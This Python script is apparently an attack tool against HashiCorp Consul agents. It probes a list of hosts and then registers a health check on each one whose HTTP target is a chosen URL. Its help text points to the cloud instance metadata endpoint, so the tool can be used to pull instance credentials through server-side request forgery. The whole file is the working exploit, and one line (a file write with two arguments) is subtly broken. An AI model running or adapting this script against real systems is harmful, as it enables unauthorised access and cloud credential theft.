#!/usr/bin/env python3

import requests
import argparse
import json
from datetime import datetime


class ConsulRegister:

    def __init__(self, query, token=None):
        self.token = token
        self.query = query

    def register_check(self, host):
        check_payload = {
            "ID": "test",
            "Name": "REQUIRED Test",
            "Notes": "qqq",
            "DeregisterCriticalServiceAfter": "90m",
            "DockerContainerID": "f972c95ebf0e",
            "Shell": "/bin/bash",
            "HTTP": self.query,
            "Method": "GET",
            "Header": {"Content-Type": ["application/json"]},
            "Body": "{\"check\":\"test\"}",
            "TCP": "localhost:22",
            "Interval": "10s",
            "Timeout": "5s",
            "TLSSkipVerify": True,
        }
        payload_json = json.dumps(check_payload)
        content_length = str(len(payload_json))
        headers = {
            "Accept": "application/json, text/javascript, /;",
            "X-Requested-With": "XMLHttpRequest",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.102 Safari/537.36",
            "Referer": "<hostname_with_port>",
            "Accept-Encoding": "gzip, deflate",
            "Accept-Language": "en-US,en;q=0.9",
            "Connection": "close",
            "Content-Length": content_length,
            "X-Consul-Token": self.token,
            "Content-Type": "application/json",
        }
        register_url = f"{host}/v1/agent/check/register"
        response = requests.put(
            register_url, headers=headers, data=payload_json)
        if response.status_code == 200:
            print(f"Check registered successfully with {host}")
        else:
            print(
                f"Failed to register check with {host}. Response: {response.text}")

    @staticmethod
    def save_result(hostnames_with_port):
        current_date = datetime.now().strftime("%m-%d-%Y")
        output_file = f"output_{current_date}.txt"
        with open(output_file, "w") as o:
            for host in hostnames_with_port:
                o.write(host, "\n")
        print(f"Hostnames saved to {output_file}")


def main(args):

    consul_checker = ConsulRegister(args.query, args.token)
    # check if either a file or a host is defined
    if args.file:
        with open(args.file, "r") as f:
            hostnames = [line.strip() for line in f.readlines()]
    elif args.host:
        hostnames = [args.host]
    else:
        print("Error: Either a file or a host is required")
    # Check HTTP response code for each hostname and add the appropriate prefix
    hostnames_with_port = []
    for hostname in hostnames:
        try:
            response = requests.get(
                "http://{}:{}".format(hostname, args.port), timeout=args.timeout)
            if response.status_code == 200:
                hostnames_with_port.append(
                    "http://{}:{}".format(hostname, args.port))
            else:
                hostnames_with_port.append(
                    "https://{}:{}".format(hostname, args.port))
        # exception type requests.exceptions.Timeout, requests.exceptions.HTTPError, and requests.exceptions.ConnectionError
        except requests.exceptions.RequestException as e:
            print(f"Error connecting to {hostname}: {e}")
    print("Hostnames with port: ", hostnames_with_port)
    consul_checker.save_result(hostnames_with_port)
    for host in hostnames_with_port:
        consul_checker.register_check(host)


if __name__ == "__main__":

    # create an argument parser
    parser = argparse.ArgumentParser(
        description="Read the contents of the hostname file or provide a single host")
    couple = parser.add_mutually_exclusive_group(required=True)
    couple.add_argument(
        "-f", "--file", help="Provide a hostname/IP Address file")
    couple.add_argument(
        "-H", "--host", help="Provide a single hostname/IP Address")
    parser.add_argument("-p", "--port", default=80,
                        required=True, help="Provide the port")
    parser.add_argument("-t", "--timeout", type=float, default=1,
                        help="Timeout value in seconds (default: 1)")
    parser.add_argument("-T", "--token", required=False,
                        help="consul access token")
    parser.add_argument("-q", "--query", required=True,
                        help="enter the IMDS url- http://169.254.169.254/latest/meta-data/profile")
    # Let's assign the arguments to a Namespace object called args using args = parser.parse_args(). We could also assign the arguments to a dictionary called args.
    args = parser.parse_args()
    main(args)
